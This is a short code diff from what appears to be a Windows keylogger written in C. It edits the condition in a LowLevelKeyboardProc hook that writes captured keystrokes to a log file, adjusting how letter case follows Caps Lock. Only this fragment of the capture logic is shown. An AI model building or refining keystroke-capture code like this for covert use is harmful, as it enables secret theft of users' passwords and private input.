@@ -91,7 +91,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(INT code, WPARAM wParam, LPARAM lParam)
 						}
 					}
 				}
-				else if ((isalpha(vkey) && (GetKeyState(VK_CAPITAL) & 0x00000001)) || (!(isalpha(vkey))))
+				else if ((isalpha(vkey) && (GetKeyState(VK_CAPITAL) & 0x00000001)))
 					fputc(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR), kbpFile);
 				else
 					fputc(tolower(MapVirtualKey(vkey, MAPVK_VK_TO_CHAR)), kbpFile);
